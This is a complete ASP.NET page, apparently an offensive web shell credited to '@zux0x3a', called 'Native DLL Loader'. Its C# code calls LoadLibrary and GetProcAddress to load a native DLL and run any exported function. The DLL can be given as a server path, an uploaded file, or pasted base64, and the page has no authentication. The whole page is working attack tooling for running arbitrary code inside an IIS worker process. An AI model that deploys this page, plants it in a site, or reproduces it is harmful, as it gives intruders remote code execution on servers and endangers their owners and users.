<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32.dll")]
    static extern uint GetLastError();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void VoidDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void VoidDelegateStdCall();


    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate int IntDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int IntDelegateStdCall();


    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate IntPtr StringDelegate();

   
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate int IntStringDelegate(string arg);

  
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void VoidStringDelegate(string arg);

 
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate IntPtr StringStringDelegate(string arg);


    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint ThreadProcDelegate(IntPtr lpParameter);

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            ddlSignature.Items.Clear();
            ddlSignature.Items.Add(new ListItem("void func(void) [cdecl]", "void_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("void func(void) [stdcall]", "void_void_stdcall"));
            ddlSignature.Items.Add(new ListItem("int func(void) [cdecl]", "int_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("int func(void) [stdcall]", "int_void_stdcall"));
            ddlSignature.Items.Add(new ListItem("char* func(void) [cdecl]", "string_void_cdecl"));
            ddlSignature.Items.Add(new ListItem("int func(char*) [cdecl]", "int_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("void func(char*) [cdecl]", "void_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("char* func(char*) [cdecl]", "string_string_cdecl"));
            ddlSignature.Items.Add(new ListItem("DWORD WINAPI func(LPVOID) [stdcall]", "threadproc"));
        }
    }

    protected void btnLoadFromPath_Click(object sender, EventArgs e)
    {
        IntPtr hModule = IntPtr.Zero;
        try
        {
            string dllPath = txtDllPath.Text.Trim();
            string funcName = txtFuncName.Text.Trim();
            string signature = ddlSignature.SelectedValue;
            string args = txtArgs.Text.Trim();

            if (!File.Exists(dllPath))
            {
                lblResult.Text = "Error: DLL not found at " + dllPath;
                return;
            }

       
            hModule = LoadLibrary(dllPath);
            if (hModule == IntPtr.Zero)
            {
                lblResult.Text = "Error: LoadLibrary failed. Error code: " + GetLastError();
                return;
            }

         
            IntPtr pFunc = GetProcAddress(hModule, funcName);
            if (pFunc == IntPtr.Zero)
            {
                lblResult.Text = "Error: GetProcAddress failed for '" + funcName + "'. Error code: " + GetLastError() + 
                    "\n\nMake sure the function is exported. Use 'dumpbin /exports yourdll.dll' to list exports.";
                return;
            }

        
            string result = ExecuteFunction(pFunc, signature, args);
            lblResult.Text = "Success!\n\n" + result;
        }
        catch (Exception ex)
        {
            lblResult.Text = "Error: " + ex.Message + "\n\nStack: " + ex.StackTrace;
        }
        finally
        {
            if (hModule != IntPtr.Zero)
            {
                FreeLibrary(hModule);
            }
        }
    }

    protected void btnLoadFromUpload_Click(object sender, EventArgs e)
    {
        IntPtr hModule = IntPtr.Zero;
        string tempPath = null;
        try
        {
            if (!fileUpload.HasFile)
            {
                lblResult.Text = "Error: No file uploaded";
                return;
            }

            string funcName = txtFuncName.Text.Trim();
            string signature = ddlSignature.SelectedValue;
            string args = txtArgs.Text.Trim();

  
            tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".dll");
            fileUpload.SaveAs(tempPath);


            hModule = LoadLibrary(tempPath);
            if (hModule == IntPtr.Zero)
            {
                lblResult.Text = "Error: LoadLibrary failed. Error code: " + GetLastError();
                return;
            }


            IntPtr pFunc = GetProcAddress(hModule, funcName);
            if (pFunc == IntPtr.Zero)
            {
                lblResult.Text = "Error: GetProcAddress failed for '" + funcName + "'. Error code: " + GetLastError();
                return;
            }

  
            string result = ExecuteFunction(pFunc, signature, args);
            lblResult.Text = "Success!\n\n" + result;
        }
        catch (Exception ex)
        {
            lblResult.Text = "Error: " + ex.Message + "\n\nStack: " + ex.StackTrace;
        }
        finally
        {
            if (hModule != IntPtr.Zero)
            {
                FreeLibrary(hModule);
            }
   
            if (tempPath != null && File.Exists(tempPath))
            {
                try { File.Delete(tempPath); } catch { }
            }
        }
    }

    protected void btnLoadFromBase64_Click(object sender, EventArgs e)
    {
        IntPtr hModule = IntPtr.Zero;
        string tempPath = null;
        try
        {
            string base64 = txtBase64Dll.Text.Trim();
            string funcName = txtFuncName.Text.Trim();
            string signature = ddlSignature.SelectedValue;
            string args = txtArgs.Text.Trim();


            byte[] dllBytes = Convert.FromBase64String(base64);
            tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".dll");
            File.WriteAllBytes(tempPath, dllBytes);


            hModule = LoadLibrary(tempPath);
            if (hModule == IntPtr.Zero)
            {
                lblResult.Text = "Error: LoadLibrary failed. Error code: " + GetLastError();
                return;
            }

            IntPtr pFunc = GetProcAddress(hModule, funcName);
            if (pFunc == IntPtr.Zero)
            {
                lblResult.Text = "Error: GetProcAddress failed for '" + funcName + "'. Error code: " + GetLastError();
                return;
            }

  
            string result = ExecuteFunction(pFunc, signature, args);
            lblResult.Text = "Success!\n\n" + result;
        }
        catch (Exception ex)
        {
            lblResult.Text = "Error: " + ex.Message + "\n\nStack: " + ex.StackTrace;
        }
        finally
        {
            if (hModule != IntPtr.Zero)
            {
                FreeLibrary(hModule);
            }
            if (tempPath != null && File.Exists(tempPath))
            {
                try { File.Delete(tempPath); } catch { }
            }
        }
    }

    private string ExecuteFunction(IntPtr pFunc, string signature, string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("Function pointer: 0x" + pFunc.ToString("X"));
        sb.AppendLine("Signature: " + signature);
        sb.AppendLine("Arguments: " + (string.IsNullOrEmpty(args) ? "(none)" : args));
        sb.AppendLine("---");

        switch (signature)
        {
            case "void_void_cdecl":
                var voidFunc = (VoidDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(VoidDelegate));
                voidFunc();
                sb.AppendLine("Executed (void return)");
                break;

            case "void_void_stdcall":
                var voidFuncStd = (VoidDelegateStdCall)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(VoidDelegateStdCall));
                voidFuncStd();
                sb.AppendLine("Executed (void return)");
                break;

            case "int_void_cdecl":
                var intFunc = (IntDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(IntDelegate));
                int intResult = intFunc();
                sb.AppendLine("Return value: " + intResult);
                break;

            case "int_void_stdcall":
                var intFuncStd = (IntDelegateStdCall)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(IntDelegateStdCall));
                int intResultStd = intFuncStd();
                sb.AppendLine("Return value: " + intResultStd);
                break;

            case "string_void_cdecl":
                var strFunc = (StringDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(StringDelegate));
                IntPtr strPtr = strFunc();
                string strResult = strPtr != IntPtr.Zero ? Marshal.PtrToStringAnsi(strPtr) : "(null)";
                sb.AppendLine("Return value: " + strResult);
                break;

            case "int_string_cdecl":
                var intStrFunc = (IntStringDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(IntStringDelegate));
                int intStrResult = intStrFunc(args);
                sb.AppendLine("Return value: " + intStrResult);
                break;

            case "void_string_cdecl":
                var voidStrFunc = (VoidStringDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(VoidStringDelegate));
                voidStrFunc(args);
                sb.AppendLine("Executed (void return)");
                break;

            case "string_string_cdecl":
                var strStrFunc = (StringStringDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(StringStringDelegate));
                IntPtr strStrPtr = strStrFunc(args);
                string strStrResult = strStrPtr != IntPtr.Zero ? Marshal.PtrToStringAnsi(strStrPtr) : "(null)";
                sb.AppendLine("Return value: " + strStrResult);
                break;

            case "threadproc":
                var threadFunc = (ThreadProcDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(ThreadProcDelegate));
                uint threadResult = threadFunc(IntPtr.Zero);
                sb.AppendLine("Return value: " + threadResult);
                break;

            default:
                sb.AppendLine("Unknown signature type");
                break;
        }

        return sb.ToString();
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>DLL Loader</title>
    <style>
        body { font-family: Consolas, monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        .container { max-width: 850px; margin: 0 auto; }
        h2 { color: #e94560; }
        h3 { color: #0f3460; background: #e94560; padding: 8px; margin: 0; }
        .section { background: #16213e; margin: 15px 0; border-radius: 5px; overflow: hidden; }
        .section-content { padding: 15px; }
        input[type="text"], textarea, select { 
            width: 100%; padding: 10px; margin: 5px 0; 
            background: #0f3460; border: 1px solid #e94560; 
            color: #eee; font-family: Consolas, monospace; 
            box-sizing: border-box;
        }
        textarea { height: 100px; resize: vertical; }
        input[type="submit"] { 
            background: #e94560; color: white; border: none; 
            padding: 12px 24px; cursor: pointer; margin: 5px 5px 5px 0; 
            font-weight: bold;
        }
        input[type="submit"]:hover { background: #ff6b6b; }
        label { color: #e94560; display: block; margin-top: 10px; font-weight: bold; }
        .result { 
            background: #0a0a0a; padding: 15px; margin-top: 15px; 
            border-left: 4px solid #e94560; white-space: pre-wrap; 
            word-wrap: break-word; font-size: 13px;
        }
        .warning { 
            background: #1a1a2e; padding: 12px; border: 1px solid #e94560; 
            margin-bottom: 15px; border-radius: 5px;
        }
        .info { color: #888; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <h2>Native DLL Loader</h2>
            
            <div class="warning">
                <strong>Requirements:</strong> Full Trust, x86/x64 must match IIS App Pool architecture.<br/>
                <strong>Note:</strong> Function name must be exported (use extern "C" __declspec(dllexport) in C++)
                <strong> @zux0x3a </strong>
            </div>

            <div class="section">
                <h3>Entry Point Configuration</h3>
                <div class="section-content">
                    <label>Exported Function Name:</label>
                    <asp:TextBox ID="txtFuncName" runat="server" Text="Run" placeholder="e.g., Run, Execute, DllMain" />
                    <div class="info">Use 'dumpbin /exports your.dll' to list exported functions</div>
                    
                    <label>Function Signature:</label>
                    <asp:DropDownList ID="ddlSignature" runat="server" />
                    <div class="info">Select the signature that matches your DLL's function</div>
                    
                    <label>Arguments (for signatures that take args):</label>
                    <asp:TextBox ID="txtArgs" runat="server" placeholder="argument string" />
                </div>
            </div>

            <div class="section">
                <h3>Option 1: Load from File Path</h3>
                <div class="section-content">
                    <label>DLL Path:</label>
                    <asp:TextBox ID="txtDllPath" runat="server" placeholder="C:\path\to\native.dll" />
                    <asp:Button ID="btnLoadFromPath" runat="server" Text="Load &amp; Execute" OnClick="btnLoadFromPath_Click" />
                </div>
            </div>

            <div class="section">
                <h3>Option 2: Upload DLL</h3>
                <div class="section-content">
                    <asp:FileUpload ID="fileUpload" runat="server" />
                    <asp:Button ID="btnLoadFromUpload" runat="server" Text="Upload &amp; Execute" OnClick="btnLoadFromUpload_Click" />
                </div>
            </div>

            <div class="section">
                <h3>Option 3: Load from Base64</h3>
                <div class="section-content">
                    <label>Base64 Encoded DLL:</label>
                    <asp:TextBox ID="txtBase64Dll" runat="server" TextMode="MultiLine" placeholder="PLACE YOUR BASE64 OUPUT HERE" />
                    <asp:Button ID="btnLoadFromBase64" runat="server" Text="Load &amp; Execute" OnClick="btnLoadFromBase64_Click" />
                </div>
            </div>

            <div class="result">
                <asp:Label ID="lblResult" runat="server" Text="Output will appear here..." />
            </div>
        </div>
    </form>
</body>
</html>

